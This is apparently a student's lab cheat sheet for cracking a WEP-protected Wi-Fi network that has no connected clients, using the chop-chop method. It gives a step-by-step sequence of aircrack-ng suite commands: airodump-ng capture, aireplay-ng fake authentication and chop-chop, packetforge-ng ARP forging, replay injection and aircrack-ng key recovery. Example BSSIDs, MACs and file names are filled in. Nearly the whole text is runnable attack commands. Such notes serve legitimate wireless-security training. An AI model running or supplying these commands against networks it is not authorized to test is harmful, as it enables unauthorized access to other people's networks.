# Is ENC WEP? yes
# Is CIPHER WEP? yes
# Is AUTH OPN? yes
     # If using shared key auth see lab guide: page 231 (previously captured PRGA XOR handshake required)
# clients? no
# strong AP connect? yes
# data packets in airodump output? yes (required)
# lab guide page 249


###############################################
# Wep crack without client (chop chop)        #
# Use when fragmentation fails                #
###############################################
# STEP 1: dump ap on ch
airodump-ng -c 8 --bssid 4C:60:DE:4A:62:80 -w wepchopchop mon0
# STEP 2: fake auth
# 60 to reauth every 60 seconds
aireplay-ng -1 60 -e hostileNetwork2g -a 4C:60:DE:4A:62:80 -h 00:C0:CA:53:0A:D1 mon0
# STEP 3: chop chop attack
# wait for data packet
aireplay-ng -4 -b <bssid> -h <source_mac> mon0
aireplay-ng -4 -b 4C:60:DE:4A:62:80 -h 00:C0:CA:53:0A:D1 mon0
# STEP 4: packetforge
# src_ip can be 255.255.255.255
# dst_ip can be: 255.255.255.255
packetforge-ng -0 -a <BSSID> -h <source_mac> -l <source_ip> -k <dst_ip_local broadcast> -y <prga_xor file> -w <outfile>
packetforge-ng -0 -a 4C:60:DE:4A:62:80 -h 00:C0:CA:53:0A:D1 -l 192.168.1.100 -k 192.168.1.255 -y fragment-0416-131510.xor -w injectme.cap
# STEP 5: replay packet
aireplay-ng -2 -r <capturefile> mon0
aireplay-ng -2 -r injectme.cap mon0
# STEP 6: crack
aircrack-ng -0 wepchopchop.cap
##################### END #####################
###############################################